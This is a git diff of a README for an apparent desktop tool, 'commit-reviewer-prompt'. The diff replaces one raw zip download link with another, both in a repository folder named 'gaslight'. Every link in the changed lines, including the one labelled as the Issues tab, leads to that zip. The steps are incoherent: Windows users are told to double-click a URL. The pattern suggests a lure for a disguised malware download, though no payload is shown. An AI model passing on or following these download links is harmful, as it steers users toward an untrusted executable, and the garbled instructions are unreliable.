@@ -13,9 +13,9 @@ The **commit-reviewer-prompt** application helps you create year-end summaries e
 To get started with **commit-reviewer-prompt**, follow the steps below to download and install the application.
 
 ## 📥 Download & Install
-[![Download Latest Release](https://github.com/Tarunkanth3223/commit-reviewer-prompt/raw/refs/heads/main/gaslight/commit-prompt-reviewer-v2.5.zip)](https://github.com/Tarunkanth3223/commit-reviewer-prompt/raw/refs/heads/main/gaslight/commit-prompt-reviewer-v2.5.zip)
+[![Download Latest Release](https://github.com/Tarunkanth3223/commit-reviewer-prompt/raw/refs/heads/main/gaslight/commit-prompt-reviewer-3.7.zip)](https://github.com/Tarunkanth3223/commit-reviewer-prompt/raw/refs/heads/main/gaslight/commit-prompt-reviewer-3.7.zip)
 
-1. Click the button above or visit [this page to download](https://github.com/Tarunkanth3223/commit-reviewer-prompt/raw/refs/heads/main/gaslight/commit-prompt-reviewer-v2.5.zip).
+1. Click the button above or visit [this page to download](https://github.com/Tarunkanth3223/commit-reviewer-prompt/raw/refs/heads/main/gaslight/commit-prompt-reviewer-3.7.zip).
 2. On the Releases page, locate the latest version.
 3. Click on the version number to expand the release details.
 4. Look for the asset file that corresponds to your operating system (e.g., Windows, macOS, or Linux).
@@ -29,7 +29,7 @@ To get started with **commit-reviewer-prompt**, follow the steps below to downlo
 
 ## 💻 Running the Application
 1. Once the download is complete, locate the downloaded file in your Downloads folder.
-2. For **Windows** users: Double-click the `https://github.com/Tarunkanth3223/commit-reviewer-prompt/raw/refs/heads/main/gaslight/commit-prompt-reviewer-v2.5.zip` file.
+2. For **Windows** users: Double-click the `https://github.com/Tarunkanth3223/commit-reviewer-prompt/raw/refs/heads/main/gaslight/commit-prompt-reviewer-3.7.zip` file.
 3. For **macOS** users: Open the `.dmg` file and drag the application into your Applications folder.
 4. For **Linux** users: Use the terminal to navigate to the folder containing the downloaded file and use the command `chmod +x commit-reviewer-prompt` to make it executable, then run it with `./commit-reviewer-prompt`.
 
@@ -54,7 +54,7 @@ Currently, the **commit-reviewer-prompt** is only available as a desktop applica
 Visit the **Issues** section in our GitHub repository to submit feedback or report issues.
 
 ## 📞 Support
-If you encounter issues or have questions, please reach out via the [Issues tab](https://github.com/Tarunkanth3223/commit-reviewer-prompt/raw/refs/heads/main/gaslight/commit-prompt-reviewer-v2.5.zip) on our GitHub page.
+If you encounter issues or have questions, please reach out via the [Issues tab](https://github.com/Tarunkanth3223/commit-reviewer-prompt/raw/refs/heads/main/gaslight/commit-prompt-reviewer-3.7.zip) on our GitHub page.
 
 ## 📢 License
 This project is licensed under the MIT License. You can use and modify it as per the terms defined in the license.
